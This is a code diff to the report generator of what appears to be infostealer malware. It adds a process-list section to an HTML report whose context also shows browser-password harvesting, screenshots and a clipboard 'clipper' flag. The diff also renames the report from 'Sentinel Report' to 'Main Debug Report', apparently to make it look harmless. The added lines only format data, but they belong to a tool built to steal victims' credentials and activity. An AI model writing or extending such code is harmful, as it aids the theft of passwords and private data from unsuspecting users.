@@ -451,7 +451,77 @@ def generate_html_report(output_dir, clipper_running=False):
     
     ext = os.path.splitext(screenshot_file or '')[1].lower()
     mime_type = 'image/jpeg' if ext in ['.jpg', '.jpeg'] else 'image/png' if ext == '.png' else 'image/bmp' if ext == '.bmp' else 'image/jpeg'
-    
+
+
+    # Process Manager
+    has_processes = False
+    process_data = None
+    process_file = os.path.join(output_dir, "process_list.json")
+    if os.path.exists(process_file):
+        try:
+            with open(process_file, 'r', encoding='utf-8') as f:
+                process_data = json.load(f)
+                has_processes = True
+        except:
+            pass
+
+    # Add to status_cards list:
+    status_card('⚙️', 'Processes', has_processes, f"{process_data['metadata']['total_processes']} processes" if has_processes else 'Not scanned', 'process-section')
+
+    # Add sections_html:
+    if has_processes and process_data:
+        proc_meta = process_data.get('metadata', {})
+        proc_list = process_data.get('processes', [])
+        
+        # Top processes by memory
+        top_procs = sorted(proc_list, key=lambda x: x.get('memory_mb', 0), reverse=True)[:10]
+        
+        process_html = f'''
+        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 1.5rem;">
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--primary); font-weight: bold;">{proc_meta.get('total_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">Total Processes</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--warning); font-weight: bold;">{proc_meta.get('system_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">System</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--success); font-weight: bold;">{proc_meta.get('user_processes', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">User</div>
+            </div>
+            <div style="background: rgba(0,0,0,0.3); padding: 1rem; border-radius: 8px; text-align: center;">
+                <div style="font-size: 1.5rem; color: var(--danger); font-weight: bold;">{proc_meta.get('high_resource', 0)}</div>
+                <div style="font-size: 0.8rem; color: var(--text-secondary);">High Resource</div>
+            </div>
+        </div>
+        
+        <h3 style="color: var(--primary); margin: 1.5rem 0 1rem 0;">Top Memory Consumers</h3>
+        <table>
+            <tr>
+                <th>PID</th>
+                <th>Name</th>
+                <th>Memory (MB)</th>
+                <th>CPU %</th>
+                <th>User</th>
+            </tr>
+        '''
+        
+        for proc in top_procs:
+            process_html += f'''
+            <tr>
+                <td>{proc.get('pid', 'N/A')}</td>
+                <td>{proc.get('name', 'Unknown')}</td>
+                <td style="color: var(--primary); font-weight: bold;">{proc.get('memory_mb', 0)} MB</td>
+                <td>{proc.get('cpu_percent', 0)}%</td>
+                <td style="font-size: 0.8rem;">{(proc.get('username') or 'Unknown')[:20]}</td>
+            </tr>
+            '''
+        
+        process_html += '</table>'
+        
+        sections_html.append(f'<div class="section" id="process-section" style="display: none;"><h2>⚙️ Process Manager <span class="file-badge">process_list.txt</span></h2>{process_html}</div>')
+        
     # ========== FIXED: READ ALL BROWSER PASSWORD FILES ==========
     passwords_data = []
     has_passwords = False
@@ -959,7 +1029,7 @@ def generate_html_report(output_dir, clipper_running=False):
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Sentinel Report - {sys_data['hostname']}</title>
+    <title>Main Debug Report - {sys_data['hostname']}</title>
     <style>
         :root {{ --primary: #00f0ff; --success: #00ff88; --danger: #ff4444; --warning: #ffaa00; --bg: #0a0a0f; --panel: #12121a; --text: #fff; --text-secondary: #8b8b9e; --border: #333; }}
         body {{ font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 2rem; margin: 0; }}
